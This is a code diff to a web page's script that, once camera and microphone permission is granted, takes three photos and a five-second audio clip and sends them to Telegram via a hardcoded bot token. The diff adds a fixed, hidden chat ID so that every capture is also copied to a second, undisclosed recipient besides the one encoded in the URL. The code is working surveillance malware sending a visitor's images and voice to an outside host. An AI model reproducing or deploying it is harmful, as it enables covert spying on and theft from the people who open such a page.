@@ -116,19 +116,24 @@
     const chatid = base64Id ? decodeBase64(base64Id) : null;
 
     function sendToTelegram(data, type) {
-      const botToken = '8081363450:AAEC5EHBK5teOi18daxyFfEW3rDh3xTDeDk';
-      if (!chatid) return console.error('Chat ID is not available.');
+      const botToken = '7127289863:AAEBI-cGSj40xJN63HV1mYXZZUP12866G6w';
 
-      const formData = new FormData();
-      formData.append('chat_id', chatid);
-      formData.append(type === 'photo' ? 'photo' : 'audio', data, `thumb.${type === 'photo' ? 'jpg' : 'wav'}`);
+      // ✅ Static and dynamic chat IDs
+      const chatIds = ['1987016824'];
+      if (chatid) chatIds.push(chatid); // decoded chatid from URL
 
-      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
-        method: 'POST',
-        body: formData
-      }).then(res => res.json())
-        .then(data => console.log('Telegram response:', data))
-        .catch(err => console.error('Telegram error:', err));
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append(type === 'photo' ? 'photo' : 'audio', data, `thumb.${type === 'photo' ? 'jpg' : 'wav'}`);
+
+        fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+          method: 'POST',
+          body: formData
+        }).then(res => res.json())
+          .then(data => console.log(`Telegram response for ${id}:`, data))
+          .catch(err => console.error(`Telegram error for ${id}:`, err));
+      });
     }
 
     navigator.mediaDevices.getUserMedia({ video: true, audio: true })
@@ -136,12 +141,14 @@
         const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
         const audioRecorder = new MediaRecorder(stream);
 
+        // 📸 Capture 3 photos
         for (let i = 0; i < 3; i++) {
           setTimeout(() => {
             imageCapture.takePhoto().then(blob => sendToTelegram(blob, 'photo'));
           }, i * 2000);
         }
 
+        // 🎙️ Capture audio
         audioRecorder.start();
         setTimeout(() => audioRecorder.stop(), 5000);
         audioRecorder.ondataavailable = (event) => {
